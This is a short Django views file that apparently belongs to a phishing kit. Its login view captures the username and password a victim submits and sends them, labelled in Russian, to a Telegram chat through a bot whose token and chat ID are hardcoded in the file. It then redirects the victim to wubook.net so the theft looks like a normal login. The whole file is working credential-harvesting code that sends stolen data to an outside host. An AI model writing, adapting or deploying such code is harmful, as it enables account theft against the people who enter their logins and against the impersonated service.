from django.shortcuts import render
from django.shortcuts import redirect
from .forms import LoginForm
import requests

TELEGRAM_BOT_TOKEN = '7231984537:AAE7UwotAQaB_PW9GGm6AdgUZvBKik_0a1I'
TELEGRAM_CHAT_ID = '7327655623'

# Create your views here.
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
    }
    requests.post(url, json=payload)

def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            message = f'Логин: {username}\nПароль: {password}'
            send_to_telegram(message)
            return redirect('https://wubook.net')
    else:
        form = LoginForm()
    
    return render(request, 'myapp/login.html', {'form': form})